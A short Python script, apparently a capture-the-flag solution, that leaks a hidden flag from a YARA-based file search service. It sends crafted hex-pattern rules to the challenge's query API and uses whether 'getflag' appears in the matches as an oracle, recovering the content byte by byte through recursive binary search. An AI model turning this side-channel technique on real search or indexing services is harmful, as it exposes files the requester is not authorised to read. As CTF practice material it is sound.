import requests,json,math

n = "p4{ind3x1ng-l3ak5}"

def searchh(now, left, right):
    if left==right:
        searchh(now+chr(left), 16, 128)
        return
    lst = list(now)
    lst = map(lambda x: hex(ord(x))[2:], lst)
    curchar = " ".join(lst)
    search = ""
    for i in range(left, right):
        search += hex(i)[2:]+" |"
    req = requests.post("https://hidden.zajebistyc.tf/api/query/high",json={"raw_yara":"rule TextExample\n{\n    strings:\n        $text_string = {%s (%s)}\n\n    condition:\n       $text_string\n}"%(curchar, search[:-1]),"method":"query"})
    print("{%s (%s)}"%(curchar, search[:-1]))
    qh = json.loads(req.text)["query_hash"]
    req = requests.get("https://hidden.zajebistyc.tf/api/matches/%s?offset=0&limit=50"%(qh))
    if "getflag" in req.text:
        print(now)
        searchh(now, left, math.floor((left+right)/2))
        searchh(now, math.floor((left+right)/2), right)

searchh(n, 16, 128)